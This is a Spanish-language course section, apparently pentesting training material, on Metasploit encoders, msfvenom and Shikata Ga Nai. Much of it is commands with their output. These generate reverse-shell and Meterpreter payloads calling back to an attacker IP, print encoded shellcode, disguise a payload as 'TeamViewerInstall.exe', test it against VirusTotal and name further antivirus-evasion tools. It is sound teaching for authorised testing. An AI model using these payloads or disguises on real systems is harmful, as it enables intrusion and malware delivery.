# Sección 6: Encoders en Metasploit

## 📋 Tabla de Contenidos

1. [¿Qué son los Encoders?](#qué-son-los-encoders)
2. [Arquitecturas Soportadas](#arquitecturas-soportadas)
3. [Shikata Ga Nai](#shikata-ga-nai)
4. [msfpayload y msfencode (Legacy)](#msfpayload-y-msfencode-legacy)
5. [msfvenom (Actual)](#msfvenom-actual)
6. [Generar Payloads con Encoding](#generar-payloads-con-encoding)
7. [Seleccionar Encoders](#seleccionar-encoders)
8. [Evasión de Antivirus](#evasión-de-antivirus)
9. [VirusTotal Integration](#virustotal-integration)
10. [Limitaciones de Encoders](#limitaciones-de-encoders)

---

## 🎯 ¿Qué son los Encoders?

### Definición

> Los **Encoders** en Metasploit Framework tienen dos funciones principales:
> 1. Hacer que los payloads sean **compatibles** con diferentes arquitecturas de procesador
> 2. Ayudar con la **evasión de antivirus** (AV)

### Contexto Histórico

A lo largo de los **15 años de existencia** del Metasploit Framework, los Encoders han asistido con:
- Compatibilidad entre arquitecturas
- Evasión de sistemas de protección
- Eliminación de caracteres malos (bad characters)

---

## 🖥️ Arquitecturas Soportadas

Los Encoders modifican el payload para ejecutarse en diferentes sistemas operativos y arquitecturas:

| Arquitectura | Descripción |
|--------------|-------------|
| **x64** | Arquitectura de 64 bits (Intel/AMD) |
| **x86** | Arquitectura de 32 bits (Intel/AMD) |
| **sparc** | SPARC (Oracle/Sun) |
| **ppc** | PowerPC (IBM, Apple antiguo) |
| **mips** | MIPS (routers, dispositivos embebidos) |

---

## 🔧 Funciones de los Encoders

### 1. Compatibilidad de Arquitectura

Los encoders adaptan el payload para ejecutarse en la arquitectura correcta.

**Ejemplo**:
```
Payload original (x86) → Encoder → Payload compatible (x64)
```

### 2. Eliminación de Bad Characters

**Bad Characters** = Opcodes hexadecimales que causan problemas en la ejecución.

**Ejemplos comunes de bad characters**:
- `\x00` - Null byte (termina cadenas en C)
- `\x0a` - Line feed
- `\x0d` - Carriage return

**Solución**: El encoder **reescribe el payload** evitando estos caracteres.

### 3. Evasión de Antivirus (AV)

**Objetivo**: Ofuscar el payload para que no sea detectado por firmas de AV.

**Realidad moderna**: 
> La evasión con encoders ha **disminuido** con el tiempo, ya que los fabricantes de IPS/IDS han mejorado cómo su software maneja firmas en malware y virus.

---

## 🎭 Shikata Ga Nai (SGN)

### Origen del Nombre

**Shikata Ga Nai** (仕方がない) en japonés significa:
- "No se puede evitar"
- "No hay nada que hacer al respecto"

### Historia

**Shikata Ga Nai (SGN)** fue uno de los esquemas de encoding **más utilizados** en el pasado porque era:
- ✅ Muy difícil de detectar
- ✅ Polimórfico (cambia cada vez)
- ✅ Usa XOR con feedback aditivo

### Estado Actual

> Sin embargo, hoy en día, los métodos de detección modernos se han actualizado, y estos payloads encodificados están **lejos de ser universalmente indetectables**.

**Referencia**: 
- [Artículo de FireEye sobre Shikata Ga Nai](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)

Este artículo detalla el **por qué y cómo** Shikata Ga Nai dominó sobre otros encoders.

---

## 🛠️ msfpayload y msfencode (Legacy)

### Herramientas Antiguas (Pre-2015)

Antes de 2015, Metasploit tenía **submódulos separados**:

| Herramienta | Función |
|-------------|---------|
| **msfpayload** | Generación de payloads |
| **msfencode** | Encoding de payloads |

**Ubicación**: `/usr/share/framework2/`

### Workflow Antiguo

```bash
# 1. Generar payload
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R

# 2. Encodificar con pipe
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

### Ejemplo Completo (Antiguo)

```bash
$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
  msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf = 
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
...
```

**Parámetros**:
- `-b '\x00'` = Evitar null bytes (bad character)
- `-f perl` = Formato de salida Perl
- `-e x86/shikata_ga_nai` = Encoder a usar

---

## 🚀 msfvenom (Actual)

### Herramienta Moderna (Post-2015)

**msfvenom** combina las funciones de `msfpayload` y `msfencode` en una sola herramienta.

### Ventajas de msfvenom

- ✅ Todo-en-uno (generación + encoding)
- ✅ Más fácil de usar
- ✅ Actualizaciones constantes
- ✅ Soporta múltiples formatos de salida

---

## 🔨 Generar Payloads con msfvenom

### Ejemplo 1: Payload SIN Encoding

```bash
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes

my $buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
"\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
"\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
"\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .
...
```

**Parámetros**:
- `-a x86` = Arquitectura x86
- `--platform windows` = Plataforma Windows
- `-p windows/shell/reverse_tcp` = Payload
- `LHOST=127.0.0.1` = IP del atacante
- `LPORT=4444` = Puerto del atacante
- `-b "\x00"` = Bad characters a evitar
- `-f perl` = Formato de salida

**Observación**: Aunque no especificamos encoder, msfvenom **automáticamente usa Shikata Ga Nai** para evitar el bad character `\x00`.

---

### Ejemplo 2: Payload CON Encoding Explícito

```bash
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes

buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"
...
```

**Parámetros adicionales**:
- `-e x86/shikata_ga_nai` = Encoder específico
- Por defecto usa **3 iteraciones**

**Resultado**: El payload fue encodificado 3 veces con Shikata Ga Nai.

---

### Comparación de Payloads

#### Primera Línea SIN Encoding Explícito:
```
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9"
```

#### Primera Línea CON Encoding Explícito (3 iteraciones):
```
"\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
```

**Observación**: Completamente diferente - el encoding cambió el payload.

---

## 🎨 Cómo Funciona Shikata Ga Nai

### Visualización

![Shikata Ga Nai Encoding](https://hatching.io/static/images/blog/metasploit-payloads2/shikata.gif)

**Fuente**: https://hatching.io/blog/metasploit-payloads2/

### Mecanismo

**Shikata Ga Nai** es un encoder **polimórfico** que:
1. Usa **XOR** con claves variables
2. Aplica **feedback aditivo**
3. Genera código **diferente cada vez**

**Explicación técnica detallada**: [Analyzing Metasploit Payloads](https://hatching.io/blog/metasploit-payloads2/)

---

## 🔍 Seleccionar Encoders en msfconsole

### Comando: show encoders

Dentro de msfconsole, con un exploit y payload seleccionados:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

**Observación**: Solo vemos encoders compatibles con **x64** porque el payload seleccionado es x64.

---

### Ejemplo con Exploit x86

```bash
msf6 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

**Observación**: Muchos más encoders disponibles para **x86**.

**Encoder destacado**: `x86/shikata_ga_nai` con ranking **excellent**.

---

## 🦠 Evasión de Antivirus

### ⚠️ Advertencia Importante

> El uso de encoders **estrictamente para evasión de AV** ha disminuido con el tiempo, ya que los fabricantes de IPS/IDS han mejorado cómo su software maneja firmas en malware.

### Prueba Práctica: Generación de Payload

```bash
$ msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai \
  -f exe \
  -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

**Parámetros**:
- `-a x86` = Arquitectura x86
- `--platform windows` = Windows
- `-p windows/meterpreter/reverse_tcp` = Payload Meterpreter
- `LHOST=10.10.14.5` = IP atacante
- `LPORT=8080` = Puerto atacante
- `-e x86/shikata_ga_nai` = Encoder
- `-f exe` = Formato ejecutable
- `-o ./TeamViewerInstall.exe` = Archivo de salida

---

### Resultado en VirusTotal (1 iteración)

**Archivo**: `TeamViewerInstall.exe` (encodificado 1 vez)

**Detección**: **54 de 69 motores** detectaron el archivo como malicioso

**Principales detecciones**:
- Trojan.Generic
- Trojan.Agent
- Win32.Swrort
- Meterpreter.A
- Packed.Generic

**Conclusión**: ❌ **NO es suficiente para evasión de AV**

---

### Mejora: Múltiples Iteraciones

```bash
$ msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 \
  -e x86/shikata_ga_nai \
  -f exe \
  -i 10 \
  -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
Final size of exe file: 73802 bytes
```

**Parámetro adicional**:
- `-i 10` = **10 iteraciones** de encoding

**Observación**: El tamaño del payload **aumenta** con cada iteración:
- Iteración 0: 368 bytes
- Iteración 9: 611 bytes

---

### Resultado en VirusTotal (10 iteraciones)

**Archivo**: `TeamViewerInstall.exe` (encodificado 10 veces)

**Detección**: **52 de 65 motores** detectaron el archivo como malicioso

**Mejora**: Solo **2 detectores menos** que con 1 iteración

**Conclusión**: ❌ **AÚN NO es suficiente para evasión de AV**

> Como podemos ver, aún no es suficiente para evasión de AV. Hay un **alto número de productos** que aún detectan el payload.

---

## 🔬 VirusTotal Integration

### Herramienta: msf-virustotal

Metasploit ofrece una herramienta integrada para analizar payloads directamente desde la línea de comandos.

**Requisitos**:
- ✅ Registro gratuito en VirusTotal
- ✅ API key de VirusTotal

### Uso de msf-virustotal

```bash
$ msf-virustotal -k <API key> -f TeamViewerInstall.exe

[*] Using API key: <API key>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
```

**Proceso**:
1. Sube el archivo a VirusTotal
2. Genera hashes (MD5, SHA1, SHA256)
3. Espera el análisis
4. Muestra el reporte

---

### Reporte Detallado de VirusTotal

**Resultado**: **51 de 68 motores** detectaron el payload

**Detecciones por Antivirus**:

| Antivirus | Detectado | Versión | Resultado | Actualización |
|-----------|-----------|---------|-----------|---------------|
| ALYac | ✅ Sí | 1.1.3.1 | Trojan.CryptZ.Gen | 20220505 |
| APEX | ✅ Sí | 6.288 | Malicious | 20220504 |
| AVG | ✅ Sí | 21.1.5827.0 | Win32:SwPatch [Wrm] | 20220505 |
| Acronis | ✅ Sí | 1.2.0.108 | suspicious | 20220426 |
| Avast | ✅ Sí | 21.1.5827.0 | Win32:SwPatch [Wrm] | 20220505 |
| Avira | ✅ Sí | 8.3.3.14 | TR/Patched.Gen2 | 20220505 |
| BitDefender | ✅ Sí | 7.2 | Trojan.CryptZ.Gen | 20220505 |
| ClamAV | ✅ Sí | 0.105.0.0 | Win.Trojan.MSShellcode-6360728-0 | 20220505 |
| Kaspersky | ✅ Sí | 21.0.1.45 | HEUR:Trojan.Win32.Generic | 20220505 |
| Microsoft | ✅ Sí | 1.1.19200.5 | **Trojan:Win32/Meterpreter.A** | 20220505 |
| Sophos | ✅ Sí | 1.4.1.0 | ML/PE-A + Mal/EncPk-ACE | 20220505 |
| Symantec | ✅ Sí | 1.17.0.0 | Packed.Generic.347 | 20220505 |
| TrendMicro | ✅ Sí | 11.0.0.1006 | BKDR_SWRORT.SM | 20220505 |
| Alibaba | ❌ No | 0.3.0.5 | - | 20190527 |
| Baidu | ❌ No | 1.0.0.2 | - | 20190318 |
| Webroot | ❌ No | 1.0.0.403 | - | 20220505 |

**Detección específica de Meterpreter**: 
- Microsoft Defender detecta explícitamente como **Trojan:Win32/Meterpreter.A**

---

## ⚠️ Limitaciones de los Encoders

### Realidad del 2025

**Conclusión del curso**:
> Como era de esperar, la mayoría de los productos antivirus que encontraremos en entornos reales **aún detectarían este payload**, así que tendríamos que usar **otros métodos** para evasión de AV que están fuera del alcance de este módulo.

### Por Qué los Encoders Ya No Son Suficientes

#### 1. **Mejoras en Detección Heurística**

Los AV modernos usan:
- ✅ Análisis de comportamiento
- ✅ Sandboxing
- ✅ Machine Learning
- ✅ Detección de patrones polimórficos

#### 2. **Firmas de Encoders Conocidos**

Los AV conocen los **patrones de encoding** de:
- Shikata Ga Nai
- Otros encoders de Metasploit

**Resultado**: Detectan el **encoder mismo**, no solo el payload.

#### 3. **Detección de Meterpreter**

Meterpreter tiene **firmas conocidas** que los AV detectan incluso cuando está encodificado.

---

## 🛡️ Alternativas para Evasión de AV (Fuera del Alcance)

### Técnicas Modernas (No Cubiertas en Este Módulo)

1. **Ofuscación de Código**
   - Reescribir el payload completamente
   - Usar diferentes compiladores
   - Técnicas de metamorfismo

2. **Encriptación Personalizada**
   - Crear tu propio encriptador
   - Usar algoritmos no estándar
   - Decriptación en memoria

3. **Process Injection**
   - Inyectar en procesos legítimos
   - DLL Injection
   - Process Hollowing

4. **Shellcode Customization**
   - Escribir shellcode desde cero
   - Evitar syscalls conocidos
   - Usar técnicas de Direct Syscalls

5. **Herramientas Especializadas**
   - Veil Framework
   - Phantom-Evasion
   - Shellter
   - TheFatRat

---

## 📊 Tabla Comparativa: Encoders Principales

| Encoder | Rank | Arquitectura | Descripción | Evasión AV |
|---------|------|--------------|-------------|------------|
| **x86/shikata_ga_nai** | Excellent | x86 | Polimórfico XOR con feedback aditivo | ⚠️ Baja (detectado) |
| **x64/xor_dynamic** | Manual | x64 | XOR con clave dinámica | ⚠️ Baja |
| **x86/fnstenv_mov** | Normal | x86 | Variable-length Fnstenv/mov Dword XOR | ⚠️ Media |
| **x86/countdown** | Normal | x86 | Single-byte XOR Countdown | ⚠️ Baja |
| **generic/none** | Normal | Todas | Sin encoding (original) | ❌ Ninguna |

---

## 🎯 Casos de Uso de Encoders

### ✅ Cuándo SÍ Usar Encoders

1. **Eliminar Bad Characters**
   ```bash
   msfvenom -p windows/shell_reverse_tcp \
     LHOST=10.10.14.5 LPORT=4444 \
     -b "\x00\x0a\x0d" \
     -f c
   ```

2. **Compatibilidad de Arquitectura**
   ```bash
   msfvenom -a x64 --platform linux \
     -p linux/x64/shell_reverse_tcp \
     LHOST=10.10.14.5 LPORT=4444 \
     -f elf
   ```

3. **Cambio de Formato**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp \
     LHOST=10.10.14.5 LPORT=4444 \
     -f exe > payload.exe
   ```

### ❌ Cuándo NO Depender de Encoders

1. **Evasión de AV Moderna**
   - Los encoders estándar **ya no son efectivos**
   - Necesitas técnicas más avanzadas

2. **Entornos Empresariales**
   - EDR (Endpoint Detection and Response)
   - NGAV (Next-Gen Antivirus)
   - Sandboxing avanzado

3. **Red Team Profesional**
   - Requiere custom tooling
   - Payloads hechos a medida
   - Técnicas de evasión avanzadas

---

## 💡 Mejores Prácticas

### 1. Usar Encoding para Compatibilidad, No para Evasión

```bash
# BIEN - Eliminar bad characters
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -b "\x00\x0a\x0d" \
  -f c

# MAL - Confiar en encoding para evasión de AV
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 100 \
  -f exe
  # ← Esto NO evadirá AV moderno
```

### 2. Combinar Múltiples Técnicas

Para evasión real, necesitas:
- ✅ Custom payload development
- ✅ Ofuscación avanzada
- ✅ Process injection
- ✅ Anti-sandbox techniques
- ✅ Living off the Land (LOLBins)

### 3. Probar SIEMPRE Antes de Usar

```bash
# 1. Generar payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o payload.exe

# 2. Probar en VirusTotal (solo para testing, NO en operaciones reales)
msf-virustotal -k <API_KEY> -f payload.exe

# 3. Ajustar según resultados
```

---

## 🔑 Comandos de Referencia Rápida

### Generar Payload con Encoding

```bash
# Básico
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e <encoder> -f <formato>

# Con múltiples iteraciones
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e <encoder> -i 10 -f <formato>

# Con bad characters
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -b "\x00\x0a\x0d" -f <formato>

# Ejemplo completo
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -b "\x00" \
  -f exe -o payload.exe
```

### Ver Encoders Disponibles (en msfconsole)

```bash
# Dentro de un exploit
msf6 exploit(...) > show encoders

# Filtrar encoders
msf6 exploit(...) > show encoders | grep shikata
```

### Probar en VirusTotal

```bash
# Desde línea de comandos
msf-virustotal -k <API_KEY> -f archivo.exe

# Obtener API key: https://www.virustotal.com/gui/join-us
```

---

## 📚 Recursos Adicionales

### Documentación Oficial
- https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-encoders.html
- https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

### Artículos Técnicos
- [FireEye: Shikata Ga Nai Encoder](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)
- [Hatching: Analyzing Metasploit Payloads](https://hatching.io/blog/metasploit-payloads2/)

### Herramientas de Evasión (Avanzadas)
- Veil Framework: https://github.com/Veil-Framework/Veil
- Shellter: https://www.shellterproject.com/
- TheFatRat: https://github.com/screetsec/TheFatRat

---

## 🎓 Resumen Ejecutivo

### Conceptos Clave

1. **Encoders** = Herramientas para compatibilidad de arquitectura y eliminación de bad characters
2. **Shikata Ga Nai** = Encoder más famoso, pero **ya no efectivo** para evasión de AV
3. **msfvenom** = Herramienta moderna que combina generación y encoding
4. **Múltiples iteraciones** = Aumentan el tamaño pero **NO mejoran significativamente** la evasión
5. **Evasión moderna** = Requiere técnicas **más allá de simples encoders**

### Lo Que Aprendimos

✅ **Cómo usar encoders** para compatibilidad  
✅ **Generar payloads** con msfvenom  
✅ **Eliminar bad characters**  
✅ **Probar con VirusTotal**  
❌ **Por qué NO depender** de encoders para evasión de AV  

### Próximos Pasos

En módulos siguientes aprenderemos:
- Técnicas avanzadas de evasión
- Custom payload development
- Post-explotación efectiva
- Red Team methodologies

---

**¡Los encoders son útiles para compatibilidad, pero la evasión moderna requiere mucho más!** 🚀
